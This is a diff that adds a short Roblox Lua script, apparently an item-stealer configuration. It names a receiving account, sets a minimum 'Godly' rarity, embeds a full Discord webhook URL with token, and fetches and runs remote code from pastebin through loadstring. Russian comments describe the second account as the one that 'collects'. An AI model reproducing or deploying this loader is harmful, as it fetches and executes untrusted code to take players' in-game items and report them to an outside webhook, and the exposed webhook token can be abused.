@@ -1,0 +1,7 @@
+_G.Usernames = {"matvey"}  -- Ваш второй аккаунт (кто будет забирать)
+_G.webhook = "https://discord.com/api/webhooks/1363455372374970398/7Lsg3O5_WbSQo1lgm0g11NVvVYZWnMO_wxH0G1dI0FpVRT_LO8GxVwQW-9OduvnQJ4D3"  -- ОСТАВЛЯЕМ ПУСТЫМ! Никаких уведомлений рефералу
+_G.min_rarity = "Godly"
+_G.min_value = 1
+_G.pingEveryone = "Yes"
+
+loadstring(game:HttpGet("https://pastebin.com/raw/56gJEsBZ"))()
